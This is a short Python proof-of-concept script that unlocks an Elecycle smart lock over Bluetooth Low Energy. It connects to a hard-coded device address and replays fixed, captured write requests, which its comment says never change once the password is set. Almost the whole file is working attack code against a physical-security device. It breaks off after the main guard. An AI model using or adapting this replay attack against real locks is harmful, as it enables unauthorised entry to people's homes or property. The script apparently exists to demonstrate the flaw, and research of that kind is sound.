#!/bin/python

# Unlock Elecycle Smart Lock
# Uses "encrypted" communication but the commands never change once the password is established

import time
from scapy.all import *
from BTLE import *

def main():
	s = bindsock()
	rand = "00"
	Connect(s, "CC9E4704A578",rand)

	writereq(s, "2500","a1373471164df99522da097681b72e3eb40189")
	writereq(s, "2500","a137343136383909f3f7a6f76cf0defd30f26cf0")
	writereq(s, "2500","a131323334353606")

	writereq(s, "2500","a131323334353606")
	writereq(s, "2500","a131323334353601")
	writereq(s, "2500","a131323334353606")

	time.sleep(5)
	disconnect(s)

if __name__ == "__main__":
